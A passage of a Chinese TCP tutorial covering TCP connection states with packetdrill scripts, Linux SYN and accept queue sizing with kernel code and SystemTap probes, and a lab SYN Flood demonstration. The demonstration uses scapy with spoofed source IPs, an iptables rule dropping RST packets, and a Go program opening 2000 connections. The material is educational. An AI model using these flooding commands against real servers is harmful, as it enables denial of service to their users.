1:1(0) ack 2 win 257   执行上的脚本，使用 netstat 就可以看到 FIN_WAIT2 状态的连接了\n1 2 3  netstat -tnpa | grep 8080 tcp 0 0 192.168.81.69:8080 0.0.0.0:* LISTEN - tcp 0 0 192.168.81.69:8080 192.0.2.1:34131 FIN_WAIT2 -   当收到对端的 FIN 包以后，主动关闭方进入TIME_WAIT状态\n8、CLOSE-WAIT 当有一方想关闭连接的时候，调用 close 等系统调用关闭 TCP 连接会发送 FIN 包给对端，这个被动关闭方，收到 FIN 包以后进入CLOSE-WAIT状态。\n完整的代码见：state_close_wait.pkt\n1 2 3 4  // 向协议栈注入 FIN 包，模拟客户端发送了 FIN，主动关闭连接 +.1 \u0026lt; F. 1:1(0) win 65535 \u0026lt;mss 100\u0026gt; // 预期协议栈会发出 ACK，被动关闭方服务端进入 CLOSE_WAIT 状态 +0 \u0026gt; . 1:1(0) ack 2 \u0026lt;...\u0026gt;   执行上的脚本，使用 netstat 就可以看到 CLOSE_WAIT 状态的连接了\n1 2 3  sudo netstat -tnpa | grep -i 8080 tcp 0 0 192.168.168.15:8080 0.0.0.0:* LISTEN 15818/packetdrill tcp 1 0 192.168.168.15:8080 192.0.2.1:44948 CLOSE_WAIT 15818/packetdrill   当被动关闭方有数据要发送给对端的时候，可以继续发送数据。当没有数据发送给对方时，也会调用 close 等系统调用关闭 TCP 连接，发送 FIN 包给主动关闭的一方，同时进入LAST-ACK状态\n9、TIME-WAIT TIME-WAIT可能是所有状态中面试问的最频繁的一种状态了。这个状态是收到了被动关闭方的 FIN 包，发送确认 ACK 给对端，开启 2MSL 定时器，定时器到期时进入 CLOSED 状态，连接释放。TIME-WAIT 会有专门的文章介绍。\n完整的代码见：state_time_wait.pkt\n1 2 3 4 5 6 7 8 9 10 11  // 服务端主动断开连接 +.1 close(4) = 0 +0 \u0026gt; F. 1:1(0) ack 1 \u0026lt;...\u0026gt;  // 向协议栈注入 ACK 包，模拟客户端发送了 ACK +.1 \u0026lt; . 1:1(0) ack 2 win 257  // 向协议栈注入 FIN，模拟服务端收到了 FIN +.1 \u0026lt; F. 1:1(0) win 65535 \u0026lt;mss 100\u0026gt;  +0 `sleep 1000000`   执行上的脚本，使用 netstat 就可以看到 TIME-WAIT 状态的连接了\n1 2 3 4  netstat -tnpa | grep -i 8080  tcp 0 0 192.168.210.245:8080 0.0.0.0:* LISTEN 6297/packetdrill tcp 0 0 192.168.210.245:8080 192.0.2.1:40091 TIME_WAIT -   10、LAST-ACK LAST-ACK 顾名思义等待最后的 ACK。是被动关闭的一方，发送 FIN 包给对端等待 ACK 确认时的状态。\n完整的模拟代码见：state_last_ack.pkt\n1 2 3 4 5 6 7 8 9 10 11  // 向协议栈注入 FIN 包，模拟客户端发送了 FIN，主动关闭连接 +.1 \u0026lt; F. 1:1(0) win 65535 \u0026lt;mss 100\u0026gt; // 预期协议栈会发出 ACK +0 \u0026gt; . 1:1(0) ack 2 \u0026lt;...\u0026gt;  +.1 close(4) = 0 // 预期服务端会发出 FIN +0 \u0026gt; F. 1:1(0) ack 2 \u0026lt;...\u0026gt; sudo netstat -lnpa | grep 8080 1 ↵ tcp 0 0 192.168.190.26:8080 0.0.0.0:* LISTEN 6163/packetdrill tcp 1 1 192.168.190.26:8080 192.0.2.1:36054 LAST_ACK   当收到 ACK 以后，进入 CLOSED 状态，连接释放。\n11、CLOSING CLOSING状态在「同时关闭」的情况下出现。这里的同时关闭中的「同时」其实并不是时间意义上的同时，而是指的是在发送 FIN 包还未收到确认之前，收到了对端的 FIN 的情况。\n我们用一个简单的脚本来模拟CLOSING状态。完整的代码见 state-closing.pkt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  // ... 省略前面初始化三次握手的脚本  // 服务端随便传输一点数据给客户端 +0.100 write(4, ..., 1000) = 1000 // 断言服务端会发出 1000 字节的数据 +0 \u0026gt; P. 1:1001(1000) ack 1 \u0026lt;...\u0026gt;  // 确认 1000 字节数据 +0.01 \u0026lt; . 1:1(0) ack 1001 win 257  // 服务端主动断开，会发送 FIN 给客户端，进入 FIN-WAIT-1 +.1 close(4) = 0 // 断言协议栈会发出 ACK 确认（服务端-\u0026gt;客户端） +0 \u0026gt; F. 1001:1001(0) ack 1 \u0026lt;...\u0026gt;  // 客户端在未对服务端的 FIN 做确认时，也发出 FIN 要求断开连接，进入 LAST-ACK +.1 \u0026lt; F. 1:1(0) ack 1001 win 257  // 断言协议栈会发出 ACK 确认客户端的 FIN（服务端-\u0026gt;客户端），客户端进入 CLOSED 状态 +0 \u0026gt; . 1002:1002(0) ack 2 \u0026lt;...\u0026gt;  // 注释掉下面这一行，客户端故意不回 ACK，让连接处于 CLOSING 状态 // +.1 \u0026lt; . 2:2(0) ack 1002 win 257   运行 packetdrill 执行上面的脚本，同时开启抓包。\n使用 netstat 查看当前的连接状态就可以看到 CLOSING 状态了。\n1 2 3 4  netstat -lnpa | grep -i 8080  tcp 0 0 192.168.60.204:8080 0.0.0.0:* LISTEN - tcp 1 1 192.168.60.204:8080 192.0.2.1:55456 CLOSING -   使用 wireshark 查看如下图所示，完整的抓包文件可以从 github 下载：state-closing.pcap 整个过程如下图所示\n小结 到这里，TCP 的 11 种状态就介绍完了，我为了你准备了几道试题，看下自己的掌握的情况吧。\n作业题 1、下列TCP连接建立过程描述正确的是：\n A、服务端收到客户端的 SYN 包后等待 2*MSL 时间后就会进入 SYN_SENT 状态 B、服务端收到客户端的 ACK 包后会进入 SYN_RCVD 状态 C、当客户端处于 ESTABLISHED 状态时，服务端可能仍然处于 SYN_RCVD 状态 D、服务端未收到客户端确认包，等待 2*MSL 时间后会直接关闭连接  2、TCP连接关闭，可能有经历哪几种状态：\n A、LISTEN B、TIME-WAIT C、LAST-ACK D、SYN-RECEIVED  14、另辟蹊径看三次握手 —— 全连接队列和半连接队列与 backlog 关于三次握手，还有很多细节之前的文章没有详细介绍，这篇文章我们以 backlog 参数来深入研究一下建连的过程。通过阅读这篇文章，你会了解到下面这些知识：\n backlog、半连接队列、全连接队列是什么 linux 内核是如何计算半连接队列、全连接队列的 为什么只修改系统的 somaxconn 和 tcp_max_syn_backlog 对最终的队列大小不起作用 如何使用 systemtap 探针获取当前系统的半连接、全连接队列信息 iprouter 库中的 ss 工具的原理是什么 如何快速模拟半连接队列溢出，全连接队列溢出  注：本文中的代码和测试均在内核版本 3.10.0-514.16.1.el7.x86_64 下进行。\n半连接队列、全连接队列基本概念 为了理解 backlog，我们需要了解 listen 和 accept 函数背后的发生了什么。backlog 参数跟 listen 函数有关，listen 函数的定义如下：\n1  int listen(int sockfd, int backlog);   当服务端调用 listen 函数时，TCP 的状态被从 CLOSE 状态变为 LISTEN，于此同时内核创建了两个队列：\n 半连接队列（Incomplete connection queue），又称 SYN 队列 全连接队列（Completed connection queue），又称 Accept 队列  如下图所示。\n接下来开始详细介绍这两个队列相关的内容。\n半连接队列（SYN Queue） 当客户端发起 SYN 到服务端，服务端收到以后会回 ACK 和自己的 SYN。这时服务端这边的 TCP 从 listen 状态变为 SYN_RCVD (SYN Received)，此时会将这个连接信息放入「半连接队列」，半连接队列也被称为 SYN Queue，存储的是 \u0026ldquo;inbound SYN packets\u0026rdquo;。\n服务端回复 SYN+ACK 包以后等待客户端回复 ACK，同时开启一个定时器，如果超时还未收到 ACK 会进行 SYN+ACK 的重传，重传的次数由 tcp_synack_retries 值确定。在 CentOS 上这个值等于 5。\n一旦收到客户端的 ACK，服务端就开始尝试把它加入另外一个全连接队列（Accept Queue）。\n半连接队列的大小的计算 这里使用 SystemTap 工具插入系统探针，在收到 SYN 包以后打印当前的 SYN 队列的大小和半连接队列的总大小。\nTCP listen 状态的 socket 收到 SYN 包的处理流程如下\n1 2 3  tcp_v4_rcv  -\u0026gt;tcp_v4_do_rcv  -\u0026gt; tcp_v4_conn_request   这里注入 tcp_v4_conn_request 方法，代码如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  probe kernel.function(\u0026#34;tcp_v4_conn_request\u0026#34;) {  tcphdr = __get_skb_tcphdr($skb); dport = __tcp_skb_dport(tcphdr); if (dport == 9090) { printf(\u0026#34;reach here\\n\u0026#34;); // 当前 syn 排队队列的大小 syn_qlen = @cast($sk, \u0026#34;struct inet_connection_sock\u0026#34;)-\u0026gt;icsk_accept_queue-\u0026gt;listen_opt-\u0026gt;qlen; // syn 队列总长度 log 值 max_syn_qlen_log = @cast($sk, \u0026#34;struct inet_connection_sock\u0026#34;)-\u0026gt;icsk_accept_queue-\u0026gt;listen_opt-\u0026gt;max_qlen_log; // syn 队列总长度，2^n max_syn_qlen = (1 \u0026lt;\u0026lt; max_syn_qlen_log); printf(\u0026#34;syn queue: syn_qlen=%d, max_syn_qlen_log=%d, max_syn_qlen=%d\\n\u0026#34;, syn_qlen, max_syn_qlen_log, max_syn_qlen); // max_acc_qlen = $sk-\u0026gt;sk_max_ack_backlog; // printf(\u0026#34;accept queue length limit: %d\\n\u0026#34;, max_acc_qlen) print_backtrace(); } }   使用 stap 执行上面的脚本\n1  sudo stap -g syn_backlog.c   这样在收到 SYN 包以后可以打印当前syn 队列排队的连接个数和总大小了。\n还是以之前的 echo 程序为例，listen 的 backlog 设置为 10，如下所示。\n1 2 3  int server_fd = //...  listen(server_fd, 10 /*backlog*/)   启动 echo-server，监听 9090 端口。然后在另外一个机器上使用 nc 命令进行连接。\n1  nc 10.211.55.10 9090   此时在 stap 的输出中，已经可以看到当前的 可以看到syn 队列大小为 0，最大的队列长度是 2^4=16\n因此可以看到实际的 syn 并不是等于net.ipv4.tcp_max_syn_backlog的默认值为 128，而是将用户传入的 10 向上取了最接近的 2 的指数幂值 16。\n接下来我们来看代码中是如何计算的，半连接队列的大小与三个值有关：\n 用户层 listen 传入的backlog 系统变量 net.ipv4.tcp_max_syn_backlog，默认值为 128 系统变量 net.core.somaxconn，默认值为 128  具体的计算见下面的源码，调用 listen 函数首先会进入如下的代码。\n1 2 3 4 5 6 7 8  SYSCALL_DEFINE2(listen, int, fd, int, backlog) {  // sysctl_somaxconn 是系统变量 net.core.somaxconn 的值 \tint somaxconn = sysctl_somaxconn; \tif ((unsigned int)backlog \u0026gt; somaxconn) \tbacklog = somaxconn; \tsock-\u0026gt;ops-\u0026gt;listen(sock, backlog); }   通过 SYSCALL_DEFINE2 代码可以得知，如果用户传入的 backlog 值大于系统变量 net.core.somaxconn 的值，用户设置的 backlog 不会生效，使用系统变量值，默认为 128。\n接下来这个 backlog 值会被依次传递给 inet_listen()-\u0026gt;inet_csk_listen_start()-\u0026gt;reqsk_queue_alloc() 方法。在 reqsk_queue_alloc 方法中进行了最终的计算。精简后的代码如下。\n1 2 3 4 5 6 7 8 9 10 11  int reqsk_queue_alloc(struct request_sock_queue *queue, \tunsigned int nr_table_entries) {  nr_table_entries = min_t(u32, nr_table_entries, sysctl_max_syn_backlog); nr_table_entries = max_t(u32, nr_table_entries, 8); nr_table_entries = roundup_pow_of_two(nr_table_entries + 1); for (lopt-\u0026gt;max_qlen_log = 3; (1 \u0026lt;\u0026lt; lopt-\u0026gt;max_qlen_log) \u0026lt; nr_table_entries; lopt-\u0026gt;max_qlen_log++); }   代码中 nr_table_entries 为前面计算的 backlog 值，sysctl_max_syn_backlog 为 net.ipv4.tcp_max_syn_backlog 的值。 计算逻辑如下：\n 在 nr_table_entries 与 sysctl_max_syn_backlog 两者中的较小值，赋值给 nr_table_entries 在 nr_table_entries 和 8 取较大值，赋值给 nr_table_entries nr_table_entries + 1 向上取求最接近的最大 2 的指数次幂 通过 for 循环找不大于 nr_table_entries 最接近的 2 的对数值  下面来举几个实际的例子，以 listen(50) 为例，经过 SYSCALL_DEFINE2 中计算 backlog 的值为 min(50, somaxconn)，等于 50，接下来进入 reqsk_queue_alloc 函数的计算。\n1 2 3 4 5 6 7 8 9 10 11 12  // min(50, 128) = 50 nr_table_entries = min_t(u32, nr_table_entries, sysctl_max_syn_backlog); // max(50, 8) = 50 nr_table_entries = max_t(u32, nr_table_entries, 8); // roundup_pow_of_two(51) = 64 nr_table_entries = roundup_pow_of_two(nr_table_entries + 1);  max_qlen_log 最小值为 2^3 = 8 for (lopt-\u0026gt;max_qlen_log = 3; (1 \u0026lt;\u0026lt; lopt-\u0026gt;max_qlen_log) \u0026lt; nr_table_entries; lopt-\u0026gt;max_qlen_log++); 经过 for 循环 max_qlen_log = 2^6 = 64   下面给了几个 somaxconn、max_syn_backlog、backlog 三者之间不同组合的最终半连接队列大小值。\n   somaxconn max_syn_backlog listen backlog 半连接队列大小     128 128 5 16   128 128 10 16   128 128 50 64   128 128 128 256   128 128 1000 256   128 128 5000 256   1024 128 128 256   1024 1024 128 256   4096 4096 128 256   4096 4096 4096 8192    可以看到:\n 在系统参数不修改的情形，盲目调大 listen 的 backlog 对最终半连接队列的大小不会有影响。 在 listen 的 backlog 不变的情况下，盲目调大 somaxconn 和 max_syn_backlog 对最终半连接队列的大小不会有影响  模拟半连接队列占满 以 somaxconn=128、tcp_max_syn_backlog=128、listen backlog=50 为例，模拟的原理是在三次握手的第二步，客户端在收到服务端回复的 SYN+ACK 以后使用 iptables 丢弃这个包。这里实验的服务端是 10.211.55.10，客户端是 10.211.55.20，在客户端使用 iptables 增加一条规则，如下所示。\n1  sudo iptables --append INPUT --match tcp --protocol tcp --src 10.211.55.10 --sport 9090 --tcp-flags SYN SYN --jump DROP   这条规则的含义是丢弃来自 ip 为 10.211.55.10，源端口号为 9090 的 SYN 包，如下图所示。\n接下来使用你喜欢的语言，开始发起连接就好了，这里选择了 go，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12  func main() { \tfor i := 0; i \u0026lt; 2000; i++ { \tgo connect() \t} \ttime.Sleep(time.Minute * 10) } func connect() { \t_, err := net.Dial(\u0026#34;tcp4\u0026#34;, \u0026#34;10.211.55.10:9090\u0026#34;) \tif err != nil { \tfmt.Println(err) \t} }   执行这个 go 程序，在服务端使用 netstat 查看当前 9090 端口的连接状态，如下所示。\n1 2 3  netstat -lnpa | grep :9090 | awk \u0026#39;{print $6}\u0026#39; | sort | uniq -c | sort -rn  64 SYN_RECV  1 LISTEN   可以观察到 SYN_RECV 状态的连接个数的从 0 开始涨到 64，就不再上涨了，这里的 64 就是半连接队列的大小。\n接下来我们来看全连接队列\n全连接队列（Accept Queue） 「全连接队列」包含了服务端所有完成了三次握手，但是还未被应用调用 accept 取走的连接队列。此时的 socket 处于 ESTABLISHED 状态。每次应用调用 accept() 函数会移除队列头的连接。如果队列为空，accept() 通常会阻塞。全连接队列也被称为 Accept 队列。\n你可以把这个过程想象生产者、消费者模型。内核是一个负责三次握手的生产者，握手完的连接会放入一个队列。我们的应用程序是一个消费者，取走队列中的连接进行下一步的处理。这种生产者消费者的模式，在生产过快、消费过慢的情况下就会出现队列积压。\nlisten 函数的第二个参数 backlog 用来设置全连接队列大小，但不一定就会选用这一个 backlog 值，还受限于 somaxconn，等下会有更详细的内容说明全连接队列大小的计算规则。\n1  int listen(int sockfd, int backlog)   如果全连接队列满，内核会舍弃掉 client 发过来的 ack（应用层会认为此时连接还未完全建立）\n我们来模拟一下全连接队列满的情况。因为只有 accept 才会移除全连接的队列，所以如果我们只 listen，不调用 accept，那么很快全连接就可以被占满。\n为了贴近最底层的调用，这里用 c 语言来实现，新建一个 main.c 文件\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;sys/socket.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;errno.h\u0026gt;#include \u0026lt;arpa/inet.h\u0026gt; int main() {  struct sockaddr_in serv_addr;  int listen_fd = 0;  if ((listen_fd = socket(AF_INET, SOCK_STREAM, 0)) \u0026lt; 0) {  exit(1);  }  bzero(\u0026amp;serv_addr, sizeof(serv_addr));   serv_addr.sin_family = AF_INET;  serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);  serv_addr.sin_port = htons(8080);   if (bind(listen_fd, (struct sockaddr *) \u0026amp;serv_addr, sizeof(serv_addr)) == -1) {  exit(1);  }   // 设置 backlog 为 50  if (listen(listen_fd, 50) == -1) {  exit(1);  }  sleep(100000000);  return 0; }   编译运行gcc main.c; ./a.out，使用前面的的 go 程序发起 connect，在服务端用 netstat 查看 tcp 连接状态\n1 2 3 4  netstat -lnpa | grep :9090 | awk \u0026#39;{print $6}\u0026#39; | sort | uniq -c | sort -rn  51 ESTABLISHED  31 SYN_RECV  1 LISTEN   虽然并发发了很多请求，实际只有 51 个请求处于 ESTABLISHED 状态，还有大量请求处于 SYN_RECV 状态。\n另外注意到 backlog 等于 50，但是实际上处于 ESTABLISHED 状态的连接却有 51 个，后面会讲到。\n客户端用 netstat 查看 tcp 有几百个连接，状态全是 ESTABLISHED，如下所示。\n1 2 3 4 5  Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 10.211.55.20:37732 10.211.55.10:9090 ESTABLISHED 23618/./connect tcp 0 0 10.211.55.20:37824 10.211.55.10:9090 ESTABLISHED 23618/./connect tcp 0 0 10.211.55.20:37740 10.211.55.10:9090 ESTABLISHED 23618/./connect ...   使用 systemstap 可以实时观察当前的全连接队列情况，探针代码如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  probe kernel.function(\u0026#34;tcp_v4_conn_request\u0026#34;) {  tcphdr = __get_skb_tcphdr($skb); dport = __tcp_skb_dport(tcphdr); if (dport == 9090) { printf(\u0026#34;reach here\\n\u0026#34;); // 当前 syn 排队队列的大小 syn_qlen = @cast($sk, \u0026#34;struct inet_connection_sock\u0026#34;)-\u0026gt;icsk_accept_queue-\u0026gt;listen_opt-\u0026gt;qlen; // syn 队列总长度 log 值 max_syn_qlen_log = @cast($sk, \u0026#34;struct inet_connection_sock\u0026#34;)-\u0026gt;icsk_accept_queue-\u0026gt;listen_opt-\u0026gt;max_qlen_log; // syn 队列总长度，2^n max_syn_qlen = (1 \u0026lt;\u0026lt; max_syn_qlen_log); printf(\u0026#34;syn queue: syn_qlen=%d, max_syn_qlen_log=%d, max_syn_qlen=%d\\n\u0026#34;, syn_qlen, max_syn_qlen_log, max_syn_qlen); ack_backlog = $sk-\u0026gt;sk_ack_backlog; max_ack_backlog = $sk-\u0026gt;sk_max_ack_backlog; printf(\u0026#34;accept queue length, max: %d, current: %d\\n\u0026#34;, max_ack_backlog, ack_backlog) } }   使用 stap 执行这个探针，重新运行上面的测试，可以看到内核探针的输出结果。\n1 2 3 4 5 6  ... syn queue: syn_qlen=45, max_syn_qlen_log=6, max_syn_qlen=64 accept queue length, max: 50, current: 14 ... syn queue: syn_qlen=2, max_syn_qlen_log=6, max_syn_qlen=64 accept queue length, max: 50, current: 51   这里也可以看出全连接队列的大小变化的情况，印证了我们前面的说法。\n跟踪服务器端的一个包的结果如下：\n以下记客户端 10.211.55.20 为 A，服务端 10.211.55.10 为 B\n 1：客户端 A 发起 SYN 到服务端 B 的 9090 端口，开始三次握手的第一步 2：服务器 B 马上回复了 ACK + SYN，此时 服务器 B socket处于 SYN_RCVD 状态 3：客户端 A 收到服务器 B 的 ACK + SYN，发送三次握手最后一步的 ACK 给服务器 B，自己此时处于 ESTABLISHED 状态，与此同时，由于服务器 B 的全连接队列满，它会丢掉这个 ACK，连接还未建立 4：服务端 B 因为认为没有收到 ACK，以为是自己在 2 中的 SYN + ACK 在传输过程中丢掉了，所以开始重传，期待客户端能重新回复 ACK。 5：客户端 A 收到 B 的 SYN + ACK 以后，确实马上回复了 ACK 6 ~ 13：但是这个 ACK 同样也会被服务器 B 丢弃，服务端 B 还是认为没有收到 ACK，继续重传重传的过程同样也是指数级退避的（1s、2s、4s、8s、16s），总共历时 31s 重传 5 次 SYN + ACK 以后，服务器 B 认为没有希望，一段时间后此条 tcp 连接就被系统回收了。  SYN+ACK重传的次数是由操作系统的一个文件决定的/proc/sys/net/ipv4/tcp_synack_retries，可以用 cat 查看这个文件\n1 2  cat /proc/sys/net/ipv4/tcp_synack_retries 5   整个过程如下图所示：\n全连接队列的大小 全连接队列的大小是 listen 传入的 backlog 和 somaxconn 中的较小值。\n全连接队列大小判断是否满的函数是 /include/net/sock.h 中 的 sk_acceptq_is_full 方法。\n1 2 3 4  static inline bool sk_acceptq_is_full(const struct sock *sk) { \treturn sk-\u0026gt;sk_ack_backlog \u0026gt; sk-\u0026gt;sk_max_ack_backlog; }   这里本身没有什么毛病，只是 sk_ack_backlog 是从 0 开始计算的，所以真正全连接队列大小是 backlog + 1。当你指定 backlog 值为 1 时，能容纳的连接个数会是 2。《Unix 网络编程卷一》87 页 4.5 节有详细的对比各个操作系统 backlog 与实际全连接队列最大数量之间的关系。\nss 命令 ss 命令可以查看全连接队列的大小和当前等待 accept 的连接个数，执行 ss -lnt 即可，比如上面的 accept 队列满的例子中，执行 ss 命令的输出结果如下。\n1 2 3  ss -lnt | grep :9090 State Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 51 50 *:9090 *:*   对于 LISTEN 状态的套接字，Recv-Q 表示 accept 队列排队的连接个数，Send-Q 表示全连接队列（也就是 accept 队列）的总大小。\n我们来看看 ss 命令的底层实现。ss 命令的源码在 iproute2 项目里，它巧妙的利用了 netlink 与 TCP 协议栈中 tcp_diag 模块通信获取 socket 的详细信息。tcp_diag 是一个统计分析模块，可以获取内核中很多有用的信息，ss 输出中的 Recv-Q 和 Send-Q 就是从 tcp_diag 模块中获取的，这两个值是等于 inet_diag_msg 结构体的 idiag_rqueue 和 idiag_wqueue。tcp_diag 部分的源码如下所示。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  static void tcp_diag_get_info(struct sock *sk, struct inet_diag_msg *r, \tvoid *_info) { \tstruct tcp_info *info = _info;  \tif (inet_sk_state_load(sk) == TCP_LISTEN) { \t// 对应 Recv-Q \tr-\u0026gt;idiag_rqueue = READ_ONCE(sk-\u0026gt;sk_ack_backlog); \t// 对应 Send-Q \tr-\u0026gt;idiag_wqueue = READ_ONCE(sk-\u0026gt;sk_max_ack_backlog);\t} else if (sk-\u0026gt;sk_type == SOCK_STREAM) { \tconst struct tcp_sock *tp = tcp_sk(sk); \tr-\u0026gt;idiag_rqueue = max_t(int, READ_ONCE(tp-\u0026gt;rcv_nxt) - \tREAD_ONCE(tp-\u0026gt;copied_seq), 0); \tr-\u0026gt;idiag_wqueue = READ_ONCE(tp-\u0026gt;write_seq) - tp-\u0026gt;snd_una; \t} }   从上面的源码可以得知：\n 处于 LISTEN 状态的 socket，Recv-Q 对应 sk_ack_backlog，表示当前 socket 的完成三次握手等待用户进程 accept 的连接个数，Send-Q 对应 sk_max_ack_backlog，表示当前 socket 全连接队列能最大容纳的连接数 对于非 LISTEN 状态的 socket，Recv-Q 表示 receive queue 的字节大小，Send-Q 表示 send queue 的字节大小  其它 多大的 backlog 是合适的 前面讲了这么多，应用程序设置多大的 backlog 是合理的呢？\n答案是 It depends，根据不同过的业务场景，需要做对应的调整。\n 你如果的接口处理连接的速度要求非常高，或者在做压力测试，很有必要调高这个值 如果业务接口本身性能不好，accept 取走已建连的速度较慢，那么把 backlog 调的再大也没有用，只会增加连接失败的可能性  可以举个典型的 backlog 值供大家参考，Nginx 和 Redis 默认的 backlog 值等于 511，Linux 默认的 backlog 为 128，Java 默认的 backlog 等于 50\ntcp_abort_on_overflow 参数 默认情况下，全连接队列满以后，服务端会忽略客户端的 ACK，随后会重传SYN+ACK，也可以修改这种行为，这个值由/proc/sys/net/ipv4/tcp_abort_on_overflow决定。\n tcp_abort_on_overflow 为 0 表示三次握手最后一步全连接队列满以后 server 会丢掉 client 发过来的 ACK，服务端随后会进行重传 SYN+ACK。 tcp_abort_on_overflow 为 1 表示全连接队列满以后服务端直接发送 RST 给客户端。  但是回给客户端 RST 包会带来另外一个问题，客户端不知道服务端响应的 RST 包到底是因为「该端口没有进程监听」，还是「该端口有进程监听，只是它的队列满了」。\n小结 这篇文章我们从 backlog 参数为入口来研究了半连接队列、全连接队列的关系。简单回顾一下。\n 半连接队列：服务端收到客户端的 SYN 包，回复 SYN+ACK 但是还没有收到客户端 ACK 情况下，会将连接信息放入半连接队列。半连接队列又被称为 SYN 队列。 全连接队列：服务端完成了三次握手，但是还未被 accept 取走的连接队列。全连接队列又被称为 Accept 队列。 半连接队列的大小与用户 listen 传入的 backlog、net.core.somaxconn、net.core.somaxconn 都有关系，准确的计算规则见上面的源码分析 全连接队列的大小是用户 listen 传入的 backlog 与 net.core.somaxconn 的较小值  上面所说的结论不应当都是对的，这也是我一直的观点：结论不重要，重要的是研究的过程。我更多的是想授之以渔，教会你一些工具和方法，如果你能举一反三的去研究一些问题，那便是极好的。\n不要随意相信网上文章乱下的结论，包括我这篇。实验出真知，自己动手亲自验证一下。\n15、原始但德高望重的 DDoS 攻击方式 —— SYN Flood 攻击原理 有了前面介绍的全连接和半连接队列，理解 SYN Flood 攻击就很简单了。为了模拟 SYN Flood，我们介绍一个新的工具：Scapy。\nScapy 工具介绍 Scapy是一个用 Python 写的强大的交互式数据包处理程序。它可以让用户发送、侦听和解析并伪装网络报文。官网地址：scapy.net/ ，安装步骤见官网。\n安装好以后执行sudo scapy就可以进入一个交互式 shell\n1 2  $ sudo scapy \u0026gt;\u0026gt;\u0026gt;   发送第一个包 在服务器（10.211.55.10）开启 tcpdump 抓包\n1  sudo tcpdump -i any host 10.211.55.5 -nn   在客户端（10.211.55.5）启动sudo scapy输入下面的指令\n1 2 3  send(IP(dst=\u0026#34;10.211.55.10\u0026#34;)/ICMP()) . Sent 1 packets.   服务端的抓包文件显示服务端收到了客户端的ICMP echo request\n1 2  06:12:47.466874 IP 10.211.55.5 \u0026gt; 10.211.55.10: ICMP echo request, id 0, seq 0, length 8 06:12:47.466910 IP 10.211.55.10 \u0026gt; 10.211.55.5: ICMP echo reply, id 0, seq 0, length 8   scapy 构造数据包的方式 可以看到构造一个数据包非常简单，scapy 采用一个非常简单易懂的方式：使用/来「堆叠」多个层的数据\n比如这个例子中的 IP()/ICMP()，如果要用 TCP 发送一段字符串hello, world，就可以这样堆叠：\n1  IP(src=\u0026#34;10.211.55.99\u0026#34;, dst=\u0026#34;10.211.55.10\u0026#34;) / TCP(sport=9999, dport=80) / \u0026#34;hello, world\u0026#34;   如果要发送 DNS 查询，可以这样堆叠：\n1  IP(dst=\u0026#34;8.8.8.8\u0026#34;) / UDP() /DNS(rd=1, qd=DNSQR(qname=\u0026#34;www.baidu.com\u0026#34;))   如果想拿到返回的结果，可以使用sr（send-receive）函数，与它相关的有一个特殊的函数sr1，只取第一个应答数据包，比如\n1 2 3  \u0026gt;\u0026gt;\u0026gt; res = sr1(IP(dst=\u0026#34;10.211.55.10\u0026#34;)/ICMP()) \u0026gt;\u0026gt;\u0026gt; res \u0026lt;IP version=4 ihl=5 tos=0x0 len=28 id=65126 flags= frag=0 ttl=64 proto=icmp chksum=0xf8c5 src=10.211.55.10 dst=10.211.55.5 |\u0026lt;ICMP type=echo-reply code=0 chksum=0xffff id=0x0 seq=0x0 |\u0026gt;\u0026gt;    SYN flood 攻击 SYN Flood 是一种广为人知的 DoS（拒绝服务攻击） 想象一个场景：客户端大量伪造 IP 发送 SYN 包，服务端回复的 ACK+SYN 去到了一个「未知」的 IP 地址，势必会造成服务端大量的连接处于 SYN_RCVD 状态，而服务器的半连接队列大小也是有限的，如果半连接队列满，也会出现无法处理正常请求的情况。\n在客户端用 scapy 执行的 sr1 函数向目标机器（10.211.55.5）发起 SYN 包\n1  sr1(IP(src=\u0026#34;23.16.*.*\u0026#34;, dst=\u0026#34;10.211.55.10\u0026#34;) / TCP(dport=80, flags=\u0026#34;S\u0026#34;) )   其中服务端收到的 SYN 包的源地址将会是 23.16 网段内的随机 IP，隐藏了自己的 IP。\n1 2 3 4 5 6  netstat -lnpat | grep :80  tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 10.211.55.10:80 23.16.63.3:20 SYN_RECV - tcp 0 0 10.211.55.10:80 23.16.64.3:20 SYN_RECV - tcp 0 0 10.211.55.10:80 23.16.62.3:20 SYN_RECV -   在服务端抓包看到下面的抓包\n可以看到短时间内，服务端收到了很多虚假 IP 的 SYN 包，马上回复了 SYN+ACK 给这些虚假 IP 的服务器。这些虚假的 IP 当然一脸懵逼，我都没发 SYN，你给我发 SYN+ACK 干嘛，于是马上回了 RST。\n使用 netstat 查看服务器的状态\n1 2 3 4 5  netstat -lnpat | grep :80 tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 10.211.55.10:80 23.16.63.3:20 SYN_RECV - tcp 0 0 10.211.55.10:80 23.16.64.3:20 SYN_RECV - tcp 0 0 10.211.55.10:80 23.16.62.3:20 SYN_RECV -   服务端的 SYN_RECV 的数量偶尔涨起来又降下去，因为对端回了 RST 包，这条连接在收到 RST 以后就被从半连接队列清除了。如果攻击者控制了大量的机器，同时发起 SYN，依然会对服务器造成不小的影响。\n而且 SYN+ACK 去到的不知道是哪里的主机，是否回复 RST 完全取决于它自己，万一它不直接忽略掉 SYN，不回复 RST，问题就更严重了。服务端以为自己的 SYN+ACK 丢失了，会进行重传。\n我们来模拟一下这种场景。因为没有办法在去 SYN+ACK 包去到的主机的配置，可以在服务器用 iptables 墙掉主机发过来的 RST 包，模拟主机没有回复 RST 包的情况。\n1  sudo iptables --append INPUT --match tcp --protocol tcp --dst 10.211.55.10 --dport 80 --tcp-flags RST RST --jump DROP   这个时候再次使用 netstat 查看，满屏的 SYN_RECV 出现了\n通过服务端抓包的文件也可以看到，服务端因为 SYN+ACK 